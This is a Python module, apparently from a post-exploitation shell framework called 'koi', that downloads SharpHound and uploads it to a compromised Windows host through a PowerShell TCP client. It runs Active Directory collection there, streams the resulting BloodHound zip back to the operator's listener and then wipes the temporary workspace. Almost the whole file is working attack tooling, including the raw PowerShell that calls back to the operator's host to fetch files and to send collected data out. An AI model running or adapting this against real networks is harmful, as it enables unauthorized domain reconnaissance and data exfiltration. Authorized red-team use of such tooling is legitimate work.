from __future__ import annotations

import json
import os
import re
import select
import socket
import tempfile
import threading
import time
import urllib.request
import uuid
import zipfile

from koi.modules.blueprint import KoiModule
from koi.utils.tcp import get_local_ip, spawn_send_server


_RELEASE_API = "https://api.github.com/repos/SpecterOps/SharpHound/releases/latest"
_ASSET_RE   = re.compile(r"^SharpHound_v[\d\.]+_windows_x86\.zip$", re.I)


class SharpHoundModule(KoiModule):
    name        = "sharphound"
    description = "Fetch SharpHound, run it on target and retrieve the BloodHound zip locally."
    usage       = "sharphound <id> [-c <collection>] [-o <local_zip>]"
    category    = "Enumeration"
    platform    = "windows_ps"
    arguments   = [
        {"flags": ["-c", "--collection"], "default": "Default",
         "help":  "Collection methods passed to -c (default: Default)"},
        {"flags": ["-o", "--output"], "default": None,
         "help":  "Local path for the BloodHound zip"},
    ]

    def _fetch_release(self) -> dict:
        req = urllib.request.Request(
            _RELEASE_API,
            headers={"User-Agent": "koi-sharphound"},
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.load(resp)

    def _find_asset(self, release: dict) -> tuple[str, str] | None:
        for asset in release.get("assets", []):
            name = asset.get("name", "")
            if _ASSET_RE.match(name):
                return name, asset["browser_download_url"]
        return None

    def _download_zip(self, url: str) -> bytes:
        req = urllib.request.Request(url, headers={"User-Agent": "koi-sharphound"})
        with urllib.request.urlopen(req, timeout=60) as resp:
            return resp.read()

    def _extract_payload(self, zip_bytes: bytes) -> dict[str, bytes]:
        """Extract every file in the zip; return {basename: bytes}."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            tmp.write(zip_bytes)
            tmp_path = tmp.name
        try:
            files: dict[str, bytes] = {}
            with zipfile.ZipFile(tmp_path) as zf:
                for member in zf.namelist():
                    if member.endswith("/"):
                        continue
                    base = os.path.basename(member)
                    if not base:
                        continue
                    files[base] = zf.read(member)
            if not any(n.lower() == "sharphound.exe" for n in files):
                raise FileNotFoundError("SharpHound.exe not found in archive")
            return files
        finally:
            os.unlink(tmp_path)

    def _send_ps(self, ps_cmd: str) -> None:
        if self.session.upgraded:
            self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
            time.sleep(0.3)
            r, _, _ = select.select([self.session.conn], [], [], 1.0)
            if r:
                self.session.conn.recv(4096)
        else:
            self.sendline(ps_cmd)

    def _upload_bytes(self, raw: bytes, dest: str) -> bool:
        local_ip = get_local_ip(self.session.addr[0])
        port, thread, errors = spawn_send_server(raw, timeout=120)

        ps_cmd = (
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_f=[IO.File]::OpenWrite('{dest}');"
            f"$_b=New-Object byte[] 65536;"
            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
            f"$_f.Close();$_c.Close()"
        )
        self._send_ps(ps_cmd)
        thread.join(timeout=120)

        if errors:
            return False

        time.sleep(0.5)
        check = self._win_query(f"(Test-Path '{dest}').ToString()")
        return check.strip().lower() == "true"

    def _open_recv_server(self, timeout: float) -> tuple[int, threading.Thread, list[bytes], list[str]]:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(timeout)
        port = srv.getsockname()[1]

        received: list[bytes] = []
        error:    list[str]   = []

        def _recv():
            try:
                conn, _ = srv.accept()
                buf = b""
                while True:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    buf += chunk
                received.append(buf)
                conn.close()
            except Exception as exc:
                error.append(str(exc))
            finally:
                srv.close()

        t = threading.Thread(target=_recv, daemon=True)
        t.start()
        return port, t, received, error

    def _run_and_collect(
        self, work_dir: str, exe_name: str,
        log_name: str, collection: str, timeout: float,
    ) -> tuple[str, bytes]:
        """Run SharpHound on target, return (status, payload)."""
        local_ip = get_local_ip(self.session.addr[0])
        port, t, received, error = self._open_recv_server(timeout)

        # Chain on target:
        #   1. run SharpHound, capture stdout/stderr into log file
        #   2. SharpHound writes its zip with a default name (<timestamp>_BloodHound.zip),
        #      so we glob for *_BloodHound.zip afterwards
        #   3. Send "OK:" + zip bytes on success, "ERR:" + log on failure,
        #      "EXC:" + exception text on PowerShell exception
        ps_cmd = (
            f"$ErrorActionPreference='Continue';"
            f"$work='{work_dir}';"
            f"$exe=Join-Path $work '{exe_name}';"
            f"$log=Join-Path $work '{log_name}';"
            f"$payload=$null;"
            f"try{{"
            f"  Push-Location $work;"
            f"  & $exe -c {collection} --outputdirectory $work *>&1 | Out-File -FilePath $log -Encoding utf8;"
            f"  Pop-Location;"
            f"  $zip=Get-ChildItem -Path $work -Filter '*_BloodHound.zip' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName;"
            f"  if($zip -and (Test-Path $zip)){{"
            f"    $b=[IO.File]::ReadAllBytes($zip);"
            f"    $h=[Text.Encoding]::UTF8.GetBytes('OK:');"
            f"    $payload=New-Object byte[] ($h.Length+$b.Length);"
            f"    [Array]::Copy($h,0,$payload,0,$h.Length);"
            f"    [Array]::Copy($b,0,$payload,$h.Length,$b.Length);"
            f"  }}else{{"
            f"    $logTxt=if(Test-Path $log){{[IO.File]::ReadAllText($log)}}else{{'(no log file produced)'}};"
            f"    $payload=[Text.Encoding]::UTF8.GetBytes('ERR:'+$logTxt);"
            f"  }}"
            f"}}catch{{"
            f"  $payload=[Text.Encoding]::UTF8.GetBytes('EXC:'+$_.ToString());"
            f"}}"
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_s.Write($payload,0,$payload.Length);"
            f"$_s.Flush();$_c.Close()"
        )
        self._send_ps(ps_cmd)
        t.join(timeout=timeout)

        if error:
            raise RuntimeError(error[0])
        if not received:
            raise TimeoutError("No data received before timeout")

        data = received[0]
        if data.startswith(b"OK:"):
            return "ok", data[3:]
        if data.startswith(b"ERR:"):
            return "err", data[4:]
        if data.startswith(b"EXC:"):
            return "exc", data[4:]
        return "raw", data

    def run(self) -> None:
        collection = self.args.collection
        local_path = self.args.output or f"bloodhound_{time.strftime('%Y%m%d_%H%M%S')}.zip"

        with self.spinner("Fetching latest SharpHound release info…"):
            try:
                release = self._fetch_release()
            except Exception as exc:
                self.err(f"GitHub API request failed: {exc}")
                return

        version = release.get("tag_name", "?")
        match = self._find_asset(release)
        if match is None:
            self.err(f"No asset matching SharpHound_*_windows_x86.zip in release {version}")
            return

        asset_name, asset_url = match
        self.ok(f"Found {asset_name} ({version})")

        with self.spinner(f"Downloading {asset_name}…"):
            try:
                zip_bytes = self._download_zip(asset_url)
                files     = self._extract_payload(zip_bytes)
            except Exception as exc:
                self.err(f"Download or extraction failed: {exc}")
                return

        token  = uuid.uuid4().hex[:8]
        work   = f"C:\\Windows\\Temp\\sh_{token}"
        log_nm = "sharphound.log"
        exe_nm = next(n for n in files if n.lower() == "sharphound.exe")

        with self.spinner("Preparing remote workspace…"):
            self._win_query(
                f"New-Item -ItemType Directory -Path '{work}' -Force | Out-Null"
            )

        with self.spinner(f"Uploading {len(files)} file(s) to target…"):
            for name, blob in files.items():
                dest = f"{work}\\{name}"
                if not self._upload_bytes(blob, dest):
                    self.err(f"Upload of {name} failed.")
                    self._cleanup(work)
                    return

        # Verify SharpHound.exe is actually present after upload
        check = self._win_query(f"(Test-Path '{work}\\{exe_nm}').ToString()")
        if check.strip().lower() != "true":
            self.err(
                f"SharpHound.exe not present after upload, likely AV/AMSI removed it. "
                f"Workspace kept at {work} for inspection."
            )
            return

        self.status(
            f"Running SharpHound on target, collection: {collection}. "
            f"This can take several minutes."
        )
        try:
            with self.spinner("Collecting and waiting for the zip…"):
                status, payload = self._run_and_collect(
                    work, exe_nm, log_nm, collection, timeout=1800.0
                )
        except Exception as exc:
            self.err(
                f"SharpHound run failed: {exc}. "
                f"Workspace kept at {work} for inspection."
            )
            return

        if status != "ok":
            text = payload.decode("utf-8", errors="replace")
            label = {"err": "SharpHound did not produce a zip", "exc": "PowerShell exception", "raw": "Unexpected response"}[status]
            self.err(f"{label}. Workspace kept at {work} for inspection.")
            print()
            self.breaker(label)
            print(text)
            self.breaker()
            return

        try:
            with open(local_path, "wb") as f:
                f.write(payload)
        except OSError as exc:
            self.err(f"Could not write {local_path}: {exc}")
            self._cleanup(work)
            return

        self._cleanup(work)

        self.box("SharpHound complete", {
            "version":   version,
            "asset":     asset_name,
            "local zip": os.path.abspath(local_path),
            "size":      f"{len(payload)} bytes ({len(payload)/1024:.1f} KB)",
        })

    def _cleanup(self, work_dir: str) -> None:
        try:
            self._win_query(
                f"Remove-Item -Recurse -Force '{work_dir}' -ErrorAction SilentlyContinue"
            )
        except Exception:
            pass
